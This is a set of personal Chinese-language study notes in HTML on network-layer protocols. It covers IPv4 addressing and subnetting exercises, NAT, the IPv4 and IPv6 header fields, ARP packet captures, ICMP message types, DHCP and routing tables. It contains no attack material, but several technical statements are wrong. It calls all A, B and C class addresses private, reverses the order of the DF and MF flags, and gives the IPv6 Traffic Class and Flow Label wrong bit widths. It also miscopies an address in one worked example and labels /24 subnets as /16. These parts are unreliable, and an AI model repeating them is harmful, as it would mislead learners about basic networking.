src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208190722568.png"
alt="image-20230208190722568" />
<figcaption aria-hidden="true">image-20230208190722568</figcaption>
</figure>
<p>A类地址的网络地址占一个字节</p>
<p>整个IP地址空间的一半都是A类地址</p>
<p>B类地址的网络地址占两个字节</p>
<p>整个IP地址空间的四分之一是B类地址</p>
<p>其中A,B,C类网络地址是私有地址</p>
<h5 id="特殊ip地址">特殊IP地址</h5>
<table>
<colgroup>
<col style="width: 8%" />
<col style="width: 12%" />
<col style="width: 12%" />
<col style="width: 14%" />
<col style="width: 52%" />
</colgroup>
<thead>
<tr>
<th><strong>网络号</strong></th>
<th><strong>主机号</strong></th>
<th><strong>源地址使用</strong></th>
<th><strong>目的地址使用</strong></th>
<th><strong>意义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>可以</td>
<td>不可</td>
<td>默认路径地址0.0.0.0，<br />本网络上的本主机</td>
</tr>
<tr>
<td>0</td>
<td>host-id</td>
<td>可以</td>
<td>不可</td>
<td>本网络上的某个主机</td>
</tr>
<tr>
<td>全1</td>
<td>全1</td>
<td>不可</td>
<td>可以</td>
<td>广播地址255.255.255.255，<br />只在本网络上广播（路由器不转发）<br />范围局限在LAN中,即同一子网掩码的网段内</td>
</tr>
<tr>
<td>net-id</td>
<td>全1</td>
<td>不可</td>
<td>可以</td>
<td>特定子网的广播地址，<br />对net-id上所有主机广播</td>
</tr>
<tr>
<td>127</td>
<td>非全0或全1的数</td>
<td>可以</td>
<td>可以</td>
<td>用作本地软件环回测试</td>
</tr>
<tr>
<td>169.254</td>
<td>0</td>
<td>可以</td>
<td>可以</td>
<td>主机无法获取IP地址时<br />会自动配置地址169.254.x.x/16，<br />使其可以通信</td>
</tr>
</tbody>
</table>
<h5 id="多级ip地址">多级IP地址</h5>
<p>早期的网络地址=网络号+主机号</p>
<p>然而这种划分有很多浪费,于是引入三级IP地址</p>
<p>网络地址=网络号+子网号+主机号</p>
<p>只需要给大组织分配一个A或者B类地址,然后该组织自己划分子网号即可</p>
<p>只看IP地址是看不出有没有划分过子网的</p>
<p>这就是子网掩码的作用了</p>
<p>子网掩码"掩"住的是子网前缀,比如255.255.255.0这个子网掩码,它表明只有IP地址的最后一个字节才是主机号,前面的是网络号和子网号.</p>
<p><span class="math display">\[
网络地址(原网络地址+子网地址)=IP地址 按位与 子网掩码
\]</span></p>
<p>192.168.1.0这是网络地址</p>
<p>192.168.1.255这是子网的广播地址</p>
<p>192.168.1.[1,254]这是可以给主机分配的IP地址</p>
<h5 id="子网掩码和网关">子网掩码和网关</h5>
<p>一个计算机尝试访问另一个IP地址时,会进行如下计算:</p>
<p>自己的IP地址和自己的子网掩码按位与得到自己的网络地址</p>
<p>目标的IP地址和自己的子网掩码按位与,结果与自己的网络地址比较</p>
<p>如果相同说明目标计算机是"网上邻居",同处于一个子网内,则链路层帧的目的MAC地址就会填写该目标计算机的MAC地址.如果不知道邻居的MAC地址,会使用ARP协议,根据邻居的IP地址,查邻居的MAC地址</p>
<p>如果不同说明目标不在同一子网内,需要访问"外面的世界".这就需要网关转发,于是将链路层目的MAC地址填上网关的MAC地址.</p>
<blockquote>
<p>如何获取网关的MAC地址?</p>
<p>这台计算机是有网关的IP地址的,不管是手动填上的还是DHCP获取的,反正就是有</p>
<p>然后本计算机通过ARP协议,根据网关的IP地址询问网关的MAC地址</p>
</blockquote>
<p>这就存在一种单向通的情况:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208195437212.png"
alt="image-20230208195437212" />
<figcaption aria-hidden="true">image-20230208195437212</figcaption>
</figure>
<p>192.168.3.4/16可以往192.168.1.1/24发包,并且可以被收到</p>
<p>但是192.168.1.1/24无法向192.168.3.4/16发包,</p>
<p>因为PC1@192.168.1.1经过计算,192.168.3.4是一个外网地址,但是自己没有设置网关,因此不知道应该把包发给谁</p>
<h5 id="可变长子网掩码vlsm">可变长子网掩码VLSM</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208200108836.png"
alt="image-20230208200108836" />
<figcaption aria-hidden="true">image-20230208200108836</figcaption>
</figure>
<h5 id="地址划分举例">地址划分举例</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208200145777.png"
alt="image-20230208200145777" />
<figcaption aria-hidden="true">image-20230208200145777</figcaption>
</figure>
<blockquote>
<p>分配给某一小型组织机构一个地址块，我们已知块中一个地址是205.16.37.39/28，求该块的起始地址?</p>
<p>网络前缀有28位,这就意味着IP地址的前三个字节都是固定死的205.16.37,最后这个字节的高四位是固定死的</p>
<p>39=0010'0111b,那么起始地址应该是0010'0000b,也就是32</p>
<p>因此这个网络块的起始地址是205.16.37.32</p>
<p>块的起始地址一般不会分配,作为网络地址</p>
<p>块的最后地址也不会分配,作为本块的广播地址</p>
</blockquote>
<blockquote>
<p>已给一个组织分配了17.12.14.0/26的地址块，该组织有3个部门，需要划分为32、16和16个地址的子块。</p>
<p>17.12.14.0/26这个地址空间里有<span
class="math inline">\(2^{32-26}=64\)</span>个地址,恰好划分为32+16+16</p>
<p>因此可以这样划分:</p>
<p>172.12.14.00'100000/27,即172.12.14.32/27</p>
<p>172.12.14.00'010000/28,即172.12.14.16/28</p>
<p>172.12.14.00'000000/28,即172.12.14.0/28</p>
</blockquote>
<blockquote>
<p>某单位分配到一个 B 类 IP 地址，其net-id为129.250.0.0。</p>
<p>该单位有4000台机器，平均分布在16个不同的地点。</p>
<p>如选用子网掩码为255.255.255.0，试给每一地点分配一个子网号码，</p>
<p>并计算出每个地点主机号码的最小值和最大值。</p>
<p>4000台机器均分到16个地点,则每个地点有250台,一个/24子网中最多有256-2=254台</p>
<p>因此一个255.255.255.0子网可以容纳250台机器</p>
<p>只需要将129.250.0.0/16这样划分:</p>
<table>
<colgroup>
<col style="width: 19%" />
<col style="width: 21%" />
<col style="width: 21%" />
<col style="width: 38%" />
</colgroup>
<thead>
<tr>
<th>子网号(Binary)</th>
<th>子网号(Decimal)</th>
<th>网络地址</th>
<th>主机IP地址范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>00000000</td>
<td>0</td>
<td>129.250.0.0/16</td>
<td>129.250.0.1~129.250.0.254</td>
</tr>
<tr>
<td>00000001</td>
<td>1</td>
<td>129.250.1.0/16</td>
<td>129.250.1.1~129.250.1.254</td>
</tr>
<tr>
<td>00000010</td>
<td>2</td>
<td>129.250.2.0/16</td>
<td>129.250.2.1~129.250.2.254</td>
</tr>
<tr>
<td>00000011</td>
<td>3</td>
<td>129.250.3.0/16</td>
<td>129.250.3.1~129.250.3.254</td>
</tr>
<tr>
<td></td>
<td></td>
<td>...</td>
<td></td>
</tr>
<tr>
<td>00001111</td>
<td>15</td>
<td>129.250.15.0/16</td>
<td>129.250.15.1~129.250.15.254</td>
</tr>
</tbody>
</table>
</blockquote>
<h4 id="nat地址转换">NAT地址转换</h4>
<table>
<thead>
<tr>
<th>NAT类型</th>
<th>映射关系</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>静态NAT</td>
<td>一个内网地址对应一个公网地址</td>
<td></td>
</tr>
<tr>
<td>动态NAT</td>
<td>多个内网地址对应多个公网地址</td>
<td></td>
</tr>
<tr>
<td>PAT</td>
<td>多个内网地址对应一个公网地址的多个端口号</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="ipv4包">IPv4包</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031183937685.png"
alt="image-20221031183937685" />
<figcaption aria-hidden="true">image-20221031183937685</figcaption>
</figure>
<p>Data用于承载运输层的协议,比如TCP,UDP</p>
<p>Header是IPv4数据报首部,其中Option为可选项,除此之外的前20个字节是固定的</p>
<h5 id="ver">VER</h5>
<p>4bits</p>
<p>IP协议的版本号,目前只有4和6两种,代表IPv4,IPv6</p>
<p>两种IP协议的首部有区别,但是接收方只要是看到这个VER字段,就可以决定后面用IPv6还是IPv4协议来解释后面的数据报了</p>
<h5 id="hlen">HLEN</h5>
<p>4bits</p>
<p>由于存在Option这个变量,为了区分首部和数据,需要维护一个值,记录IPv4数据报的首部共有多少字节.这个值就放在HLEN字段,共4位,最大是15,单位是4字节,也就是说,IPv4首部最大可以是15*4=60字节,即Option最大是40字节</p>
<p>由于首部最小是20字节,因此HLEN这个值最小是5</p>
<h5 id="service">SERVICE</h5>
<p>8bits</p>
<p>要么表示服务类型</p>
<p>要么表示区分服务</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031185352059.png"
alt="image-20221031185352059" />
<figcaption aria-hidden="true">image-20221031185352059</figcaption>
</figure>
<h6 id="服务类型">服务类型</h6>
<p>用于获得更好的服务</p>
<blockquote>
<p>注意服务类型不是高层协议类型</p>
<p>运输层上使用的是TCP还是UDP等等,是由Protocol字段决定的</p>
</blockquote>
<p>用于描述上层(运输层)的服务类型,</p>
<p>前3bits用于描述优先级</p>
<p>后1bits不使用</p>
<p>中间4bits,DTRC,用于描述服务类型</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212153218410.png"
alt="image-20230212153218410" />
<figcaption aria-hidden="true">image-20230212153218410</figcaption>
</figure>
<h6 id="差分服务">差分服务</h6>
<p>前6bits是码点子字段,后面2bits不用</p>
<p>其中码点的不同组合有不同的意义</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031185950842.png"
alt="image-20221031185950842" />
<figcaption aria-hidden="true">image-20221031185950842</figcaption>
</figure>
<h5 id="total-length">Total Length</h5>
<p>16bits</p>
<p>总长度,len(header + data),单位,字节</p>
<p>最大长度不超过<span
class="math inline">\(2^{16}=65536bytes\)</span></p>
<p>又总长度不能超过链路层规定的最大传送单元MTU,以太网(正在使用的局域网规范)该值默认是1500字节</p>
<p>以太网链路层帧限制上层的数据报长度在46~1500字节之间,不够46字节需要填充</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031194233356.png"
alt="MTU" />
<figcaption aria-hidden="true">MTU</figcaption>
</figure>
<p>也就是说链路层的协议,其Header到Trailer之间的空间有限,最大是MTU规定的大小,IP数据报必须尊重地域差异,入乡随俗</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212153927371.png"
alt="image-20230212153927371" />
<figcaption aria-hidden="true">image-20230212153927371</figcaption>
</figure>
<h5 id="identification">Identification</h5>
<p>16bits</p>
<p>一段数据由于MTU的限制,可能要分成多个包发送,本字段用来表明哪些包是同一个文件的.</p>
<h5 id="flags">Flags</h5>
<p>3bits</p>
<p>标志,用于标识该数据报是否可以分片,如果分片,是不是最后一片</p>
<p>最前面一个bit不用</p>
<p>中间一个bit是MF位,表征是否还有分片,1则还有分片,0则表明该数据报是最后一个分片</p>
<p>最后一个bit是DF位,表征是否可以分片,1不能分片,0允许分片</p>
<table>
<thead>
<tr>
<th>reserved</th>
<th>MF</th>
<th>DF</th>
</tr>
</thead>
<tbody>
</tbody>
</table>
<h5 id="fragmentation-offset">Fragmentation Offset</h5>
<p>13bits</p>
<p>分片偏移,对于同一个包的分片,</p>
<p>指出较长的分组在分片后,其中一片在原分组中的编号.单位:8字节 <span
class="math display">\[
分片偏移=IP数据的第一个字节编号/8
\]</span></p>
<p><span class="math inline">\(8\times
2^{13}=2^{16}=65536bytes\)</span></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031194849825.png"
alt="image-20221031194849825" />
<figcaption aria-hidden="true">image-20221031194849825</figcaption>
</figure>
<blockquote>
<p>本机在10.177.148.9,使用ICMP协议给61.150.43.78发送3500个字节的数据</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ping www.xidian.edu.cn -l 3500</span><br></pre></td></tr></table></figure>
<p>其中一组ping-pong应答:</p>
<p>去的包有三个,分别长1514,1514,587字节</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031201439099.png" /></p>
<p>为啥可以比mtu=1500多?因为这是整个数据报的总长度,包括了链路层的头</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031201739441.png"
alt="image-20221031201739441" />
<figcaption aria-hidden="true">image-20221031201739441</figcaption>
</figure>
<p>前两个总长度1514字节的包,实际上IPv4数据报就是1500字节,其中IPv4首部占用了20字节</p>
</blockquote>
<h5 id="time-to-live">Time to live</h5>
<p>8bits</p>
<p>生存时间TTL,用于表示最大跳数,即该包还可以通过多少个路由器转发</p>
<p>为了防止数据报在网络上无休止地被转发而占用资源.路由器在转发每个数据报之前,都会首先将其TTL减一,如果降为0,则丢弃该数据报,不再转发</p>
<h5 id="protocol">Protocol</h5>
<p>8bits</p>
<p>协议类型,用于表示上层使用的协议,也就是data中存放的是啥协议的数据报</p>
<p>常用的协议编号如下</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031192637226.png"
alt="image-20221031192637226" />
<figcaption aria-hidden="true">image-20221031192637226</figcaption>
</figure>
<h5 id="header-checksum">Header checksum</h5>
<p>16bits</p>
<p>首部检校和,咋算的呢?</p>
<p>这里的首部包含Option字段,并且首部一定是4字节对齐的,Option如果不是4字节的倍数则向上取整到4字节的倍数</p>
<p>计算方式:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031193058326.png"
alt="image-20221031193058326" />
<figcaption aria-hidden="true">image-20221031193058326</figcaption>
</figure>
<p>需要注意的是发送方最终填写的Check Sum是校验和计算值的反码</p>
<p>接收方也是将校验和计算结果取反检查是否是全零</p>
<p>比如</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031193231527.png"
alt="image-20221031193231527" />
<figcaption aria-hidden="true">image-20221031193231527</figcaption>
</figure>
<h5 id="sourcedestination-ip-address">Source/Destination IP address</h5>
<p>分别是32bits,源和目的主机的IP地址</p>
<h5 id="option">Option</h5>
<p>可以没有,最大40字节</p>
<p>首部附加选项</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031202035076.png"
alt="image-20221031202035076" />
<figcaption aria-hidden="true">image-20221031202035076</figcaption>
</figure>
<h3 id="ipv6">IPv6</h3>
<h4 id="ipv6地址">IPv6地址</h4>
<p>长128位</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208205753221.png"
alt="image-20230208205753221" />
<figcaption aria-hidden="true">image-20230208205753221</figcaption>
</figure>
<p>懒人表示法:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208210147178.png"
alt="image-20230208210147178" />
<figcaption aria-hidden="true">image-20230208210147178</figcaption>
</figure>
<p>全零的段可以只写一个0</p>
<p>连续的全零段可以用一个Gap代替,全零段之间的冒号可以省去了.但是一个IPv6地址中<strong>只能有一个Gap</strong></p>
<blockquote>
<p>为啥只能有一个GAP?看看如何还原</p>
</blockquote>
<p>带有Gap的地址如何还原?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208210408867.png"
alt="image-20230208210408867" />
<figcaption aria-hidden="true">image-20230208210408867</figcaption>
</figure>
<h4 id="ipv6包">IPv6包</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212154305058.png"
alt="image-20230212154305058" />
<figcaption aria-hidden="true">image-20230212154305058</figcaption>
</figure>
<p>IPv6头部包括固定40个字节的基础头部和可变长度的拓展头部,拓展头部的长度会在基础头部中给出</p>
<h5 id="base-header">Base Header</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212154406661.png"
alt="image-20230212154406661" />
<figcaption aria-hidden="true">image-20230212154406661</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 37%" />
<col style="width: 51%" />
<col style="width: 10%" />
</colgroup>
<thead>
<tr>
<th>字段</th>
<th>作用</th>
<th>长度(bit)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Version</td>
<td>IPv6版本</td>
<td>4</td>
</tr>
<tr>
<td>Traffic Class</td>
<td>优先级,发生拥塞时分组的优先级</td>
<td>4</td>
</tr>
<tr>
<td>Flow Label</td>
<td>流标号,类似于之前的Identification</td>
<td>24</td>
</tr>
<tr>
<td>Payload Length</td>
<td>有效载荷长度,即拓展头+IP数据的长度,单位:字节</td>
<td>16</td>
</tr>
<tr>
<td>Next Header</td>
<td>指明上层协议,类似于Protocol</td>
<td>8</td>
</tr>
<tr>
<td>Hop Limit</td>
<td>TTL</td>
<td></td>
</tr>
<tr>
<td>Source/<br />Destination Address</td>
<td>源/目的地址</td>
<td>128/128</td>
</tr>
</tbody>
</table>
<h4 id="ipv4向ipv6过渡">IPv4向IPv6过渡</h4>
<p>三种过渡方法:</p>
<table>
<colgroup>
<col style="width: 11%" />
<col style="width: 88%" />
</colgroup>
<thead>
<tr>
<th>过渡方法</th>
<th>原理</th>
</tr>
</thead>
<tbody>
<tr>
<td>双协议栈</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155148399.png" alt="image-20230212155148399" style="zoom:25%;" /></td>
</tr>
<tr>
<td>隧道</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155201345.png" alt="image-20230212155201345" style="zoom:25%;" /></td>
</tr>
<tr>
<td>头转换</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155229167.png" alt="image-20230212155229167" style="zoom:25%;" /></td>
</tr>
</tbody>
</table>
<h3 id="arp">ARP</h3>
<h4 id="数据报">数据报</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101171944341.png"
alt="image-20221101171944341" />
<figcaption aria-hidden="true">image-20221101171944341</figcaption>
</figure>
<h5 id="hardware-type">Hardware Type</h5>
<p>16bits</p>
<p>链路层协议类型,以太网为1</p>
<h5 id="protocol-type">Protocol Type</h5>
<p>16bits</p>
<p>网络层协议类型,IP协议为0x0800</p>
<h5 id="hardware-length">Hardware length</h5>
<p>8bits</p>
<p>物理地址长度,比如以太网的物理地址,即MAC地址的长度就是6字节</p>
<h5 id="protocol-length">Protocol length</h5>
<p>8bits</p>
<p>逻辑地址长度,比如IPv4地址的长度就是4字节</p>
<h5 id="operation">Operation</h5>
<p>16bits</p>
<p>ARP分组类型,有两种,Request请求或者Reply应答</p>
<h5 id="四个地址">四个地址</h5>
<p>接下来是四个地址,依次是发送方的物理地址,发送方逻辑地址,接收方硬件地址,接收方逻辑地址</p>
<h4 id="抓包观察">抓包观察</h4>
<p>如图拓扑中</p>
<p>A@192.168.1.251试图ping B@192.168.1.250</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101172908748.png"
alt="image-20221101172908748" />
<figcaption aria-hidden="true">image-20221101172908748</figcaption>
</figure>
<p>在A的Ethernet0网卡上抓包</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173100332.png"
alt="image-20221101173100332" />
<figcaption aria-hidden="true">image-20221101173100332</figcaption>
</figure>
<p>会发现首先发送和接受的并不是ICMP报文,而是arp报文,因为此时A计算机并不知道B@192.168.1.250的物理地址是多少.因此首先要问一下</p>
<p>第20帧,A向子网发送ARP广播,其报文中包括自己的物理地址,逻辑地址,目的地的逻辑地址,但是目的地址的物理地址是一个假值</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173242804.png"
alt="image-20221101173242804" />
<figcaption aria-hidden="true">image-20221101173242804</figcaption>
</figure>
<p>第21帧,A接收到了B的单播回答</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173435707.png"
alt="image-20221101173435707" />
<figcaption aria-hidden="true">image-20221101173435707</figcaption>
</figure>
<p>此时两个主机的物理地址,逻辑地址都已经填好了</p>
<h3 id="icmp">ICMP</h3>
<p>internet control message protocol 因特网控制协议,网络层协议</p>
<p>ICMP是<strong>网络层的协议</strong>,但是其在数据帧中的位置类似于TCP数据报的位置,都是在IPv4的data位置</p>
<h4 id="报文格式">报文格式</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234511301.png"
alt="image-20221101234511301" />
<figcaption aria-hidden="true">image-20221101234511301</figcaption>
</figure>
<h5 id="type">Type</h5>
<p>ICMP报文分成差错报告和查询两种,体现在Type上</p>
<p>对于差错报告报文:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234922337.png"
alt="差错报告类型" />
<figcaption aria-hidden="true">差错报告类型</figcaption>
</figure>
<p>对于查询报文:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234949153.png"
alt="查询类型" />
<figcaption aria-hidden="true">查询类型</figcaption>
</figure>
<h5 id="code">Code</h5>
<p>代码要视报文类型决定</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101235149110.png"
alt="image-20221101235149110" />
<figcaption aria-hidden="true">image-20221101235149110</figcaption>
</figure>
<h5 id="checksum">Checksum</h5>
<p>校验和</p>
<h4 id="差错报告报文">差错报告报文</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">❏  对于携带ICMP差错报文的数据报，不再生产ICMP差错报文。</span><br><span class="line">❏  对分段的数据报文，只对第一个分段产生ICMP差错报文。</span><br><span class="line">❏  对于多播地址的数据报文，不产生ICMP差错报文。</span><br><span class="line">❏ 具有特殊地址的数据报文，如127.0.0.0或者0.0.0.0，不产生ICMP差错报文。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>差错报文数据字段:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212160806776.png"
alt="image-20230212160806776" />
<figcaption aria-hidden="true">image-20230212160806776</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 15%" />
<col style="width: 78%" />
<col style="width: 5%" />
</colgroup>
<thead>
<tr>
<th>差错报告类型</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>目的端不可达</td>
<td>路由器无法路由或者目的主机无法传递数据时,报告目的端不可达</td>
<td></td>
</tr>
<tr>
<td>源端抑制</td>
<td>配合流量控制使用<br />路由器或者目的主机发生拥塞时,丢弃数据包,发送源端抑制</td>
<td></td>
</tr>
<tr>
<td>时间超时</td>
<td>TTL减为0时,路由器丢弃<br />或者报文的部分分片没有在有限时间抵达目的主机,由目的主机发送</td>
<td></td>
</tr>
<tr>
<td>参数问题</td>
<td>IP分组首部错误<br />路由器或者目的主机丢弃分组并发送参数问题报文</td>
<td></td>
</tr>
<tr>
<td>重定向</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212161420556.png" alt="image-20230212161420556" style="zoom:25%;" /><br />向源端报告更好的路由</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="查询报文">查询报文</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212161525556.png"
alt="image-20230212161525556" />
<figcaption aria-hidden="true">image-20230212161525556</figcaption>
</figure>
<table>
<thead>
<tr>
<th>查询报文类型</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>回送请求和回答</td>
<td>诊断网络</td>
<td>ping</td>
</tr>
<tr>
<td>时间戳请求和回答</td>
<td>确定数据报往返时间,同步</td>
<td></td>
</tr>
<tr>
<td>地址掩码请求和回答</td>
<td>获取地址对应掩码</td>
<td></td>
</tr>
<tr>
<td>路由器询问和通告</td>
<td>询问路由器是否正常工作</td>
<td>tracert</td>
</tr>
</tbody>
</table>
<h5 id="tracert">tracert</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/5337919-d1900102224993c8.png"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<h3 id="dhcp协议">DHCP协议</h3>
<p>DHCP,Dynamic Host Configuration Protocol,动态主机地址分配协议</p>
<p>其前身是BOOTP(bootrap prottocol),引导程序协议,DHCP兼容BOOTP的功能</p>
<p>DHCP服务器有一个地址池,存放DHCP服务器可以动态分配的所有地址</p>
<h4 id="dhcp工作过程">DHCP工作过程</h4>
<p>DHCP握手分为四步,主机要离开子网的时候,只有一步</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101233453767.png"
alt="前四帧握手,最后一帧离开" />
<figcaption aria-hidden="true">前四帧握手,最后一帧离开</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 8%" />
<col style="width: 25%" />
<col style="width: 23%" />
<col style="width: 43%" />
</colgroup>
<thead>
<tr>
<th>DHCP报文类型</th>
<th>时机</th>
<th>方向</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Discover</td>
<td>client刚加入子网,试图索要一个ip地址</td>
<td>DHCP client--广播-&gt;DHCP servers</td>
<td>向所有DHCP server索要ip地址</td>
</tr>
<tr>
<td>Offer</td>
<td>DHCP server收到了DIscover之后</td>
<td>DHCP server--单播--&gt;DHCP client</td>
<td>所有DHCP服务器都会尝试给出一个可用的ip地址</td>
</tr>
<tr>
<td>Request</td>
<td>client收到Offer之后</td>
<td>DHCP client--广播--&gt;DHCP servers</td>
<td>client接受其中一个offer,谢绝其他offer</td>
</tr>
<tr>
<td>ACK</td>
<td>被接受offer的server收到Request之后</td>
<td>DHCP server--单播--&gt;DHCP client</td>
<td>被接受offer的server回复收到</td>
</tr>
<tr>
<td>Release</td>
<td>client将要离开子网之时</td>
<td>DHCP client--广播--&gt;DHCP servers</td>
<td>通知所有DHCP server,本client要放弃ip地址了,可以收回到ip地址池</td>
</tr>
</tbody>
</table>
<p>其中四次握手同属于一个Transaction</p>
<h3 id="路由协议">路由协议</h3>
<h4 id="路由">路由</h4>
<p>路由:从某一网络设备发出,去往某个目的地,经过的路径</p>
<p>终端计算机,路由器,三层交换机上存在路由表</p>
<p>二层交换机上只有arp表</p>
<p>根据路由的发现方式,路由可以分成三种</p>
<p>直连路由:路由器自主发现相连端口的网络的路由</p>
<p>静态路由:人工维护路由表</p>
<p>动态路由:可周期性更新</p>
<h4 id="路由表">路由表</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107110756489.png"
alt="image-20221107110756489" />
<figcaption aria-hidden="true">image-20221107110756489</figcaption>
</figure>
<p>子网掩码</p>
<p>网络地址</p>
<p>下一跳地址</p>
<p>朝向下一跳的端口</p>
<blockquote>
<p>比如网络拓扑长这样</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212162804137.png"
alt="image-20230212162804137" />
<figcaption aria-hidden="true">image-20230212162804137</figcaption>
</figure>
<p>其中R1路由表长这样</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212162818521.png"
alt="image-20230212162818521" />
<figcaption aria-hidden="true">image-20230212162818521</figcaption>
</figure>
<p>如果图22.6中的一个目的地址为180.70.65.140的分组到达路由器R1，说明其转发过程。</p>
<p>180.70.65.140这个地址属于180.70.65.128/25网段,因此应该从m0口出去</p>
<p>首先路由器会在180.70.65.128/25网段中使用ARP协议获得下一跳的MAC地址,然后将IP分组转发给下一跳</p>
</blockquote>
<h5 id="netstat--r">netstat -r</h5>
<p>在win或者linux主机上使用netstat -r命令即可查看本机的路由表</p>
<p>比如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135]</span><br><span class="line">└─# netstat -r</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface</span><br><span class="line">default         Executor        0.0.0.0         UG        0 0          0 eth0</span><br><span class="line">172.29.112.0    0.0.0.0         255.255.240.0   U         0 0          0 eth0</span><br></pre></td></tr></table></figure>
<table style="width:100%;">
<colgroup>
<col style="width: 6%" />
<col style="width: 18%" />
<col style="width: 11%" />
<col style="width: 19%" />
<col style="width: 8%" />
<col style="width: 16%" />
<col style="width: 6%" />
<col style="width: 13%" />
</colgroup>
<thead>
<tr>
<th>栏目</th>
<th>Destination</th>
<th>Gateway</th>
<th>Genmask</th>
<th>Flags</th>
<th>MSS Window</th>
<th>irtt</th>
<th>Iface</th>
</tr>
</thead>
<tbody>
<tr>
<td>意义</td>
<td>目的地址</td>
<td>网关</td>
<td>目的地址掩码</td>
<td></td>
<td></td>
<td></td>
<td>目标端口</td>
</tr>
</tbody>
</table>
<p>在eNSP路由器上用display ip
routing-table也可以查看该路由器的路由表</p>
